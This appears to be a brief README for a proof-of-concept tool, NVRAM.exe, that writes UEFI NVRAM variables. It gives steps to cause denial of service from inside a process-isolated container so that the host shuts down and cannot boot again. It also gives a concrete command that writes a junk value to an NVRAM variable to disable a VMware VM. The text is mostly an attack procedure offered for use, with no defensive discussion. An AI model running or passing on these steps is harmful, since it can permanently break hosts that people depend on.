# NVRAM command line
NVRAM.exe <R/W> {GUID of the NVRAM} <variable_name> [hex_value_of_variable]


# How to cause DOS from inside a container with process isolation
1. Copy NVRAM.exe to inside the container 
2. Run all the commands below 
3. Wait until the host will shutdown 
4. The host won't be able to boot again

# Run the following command to cause DOS on VMware VM
NVRAM.exe w {FAB7E9E1-39DD-4F2B-8408-E20E906CB6DE} HDDP aaaaaa